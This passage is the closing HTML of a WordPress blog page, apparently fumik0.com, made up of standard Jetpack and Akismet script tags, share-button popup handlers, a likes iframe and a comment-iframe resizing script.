/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/carousel/jetpack-carousel.min.js?ver=14.2-a.3" id="jetpack-carousel-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/tiled-gallery/tiled-gallery/tiled-gallery.min.js?ver=14.2-a.3" id="tiled-gallery-js" defer="defer" data-wp-strategy="defer"></script>
<script defer type="text/javascript" src="https://fumik0.com/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1704837122" id="akismet-frontend-js"></script>
<script type="text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.2-a.3" id="jetpack-block-subscriptions-js"></script>
<script type="text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=14.2-a.3" id="sharing-js-js"></script>
<script type="text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
	<iframe src='https://widgets.wp.com/likes/master.html?ver=20241218#ver=20241218&#038;n=1' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
	<div id='likes-other-gravatars' class='wpl-new-layout' role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
			<script type="text/javascript">
			(function () {
				const iframe = document.getElementById( 'jetpack_remote_comment' );
								const watchReply = function() {
					// Check addComment._Jetpack_moveForm to make sure we don't monkey-patch twice.
					if ( 'undefined' !== typeof addComment && ! addComment._Jetpack_moveForm ) {
						// Cache the Core function.
						addComment._Jetpack_moveForm = addComment.moveForm;
						const commentParent = document.getElementById( 'comment_parent' );
						const cancel = document.getElementById( 'cancel-comment-reply-link' );

						function tellFrameNewParent ( commentParentValue ) {
							const url = new URL( iframe.src );
							if ( commentParentValue ) {
								url.searchParams.set( 'replytocom', commentParentValue )
							} else {
								url.searchParams.delete( 'replytocom' );
							}
							if( iframe.src !== url.href ) {
								iframe.src = url.href;
							}
						};

						cancel.addEventListener( 'click', function () {
							tellFrameNewParent( false );
						} );

						addComment.moveForm = function ( _, parentId ) {
							tellFrameNewParent( parentId );
							return addComment._Jetpack_moveForm.apply( null, arguments );
						};
					}
				}
				document.addEventListener( 'DOMContentLoaded', watchReply );
				// In WP 6.4+, the script is loaded asynchronously, so we need to wait for it to load before we monkey-patch the functions it introduces.
				document.querySelector('#comment-reply-js')?.addEventListener( 'load', watchReply );

								
				const commentIframes = document.getElementsByClassName('jetpack_remote_comment');

				window.addEventListener('message', function(event) {
					if (event.origin !== 'https://jetpack.wordpress.com') {
						return;
					}

					if (!event?.data?.iframeUniqueId && !event?.data?.height) {
						return;
					}

					const eventDataUniqueId = event.data.iframeUniqueId;

					// Change height for the matching comment iframe
					for (let i = 0; i < commentIframes.length; i++) {
						const iframe = commentIframes[i];
						const url = new URL(iframe.src);
						const iframeUniqueIdParam = url.searchParams.get('iframe_unique_id');
						if (iframeUniqueIdParam == event.data.iframeUniqueId) {
							iframe.style.height = event.data.height + 'px';
							return;
						}
					}
				});
			})();
		</script>
		
		<a href="javascript:void(0);" class="go-top" style="display: none">
			<i class="fas fa-arrow-up"></i>
		</a>
	</body>
</html>
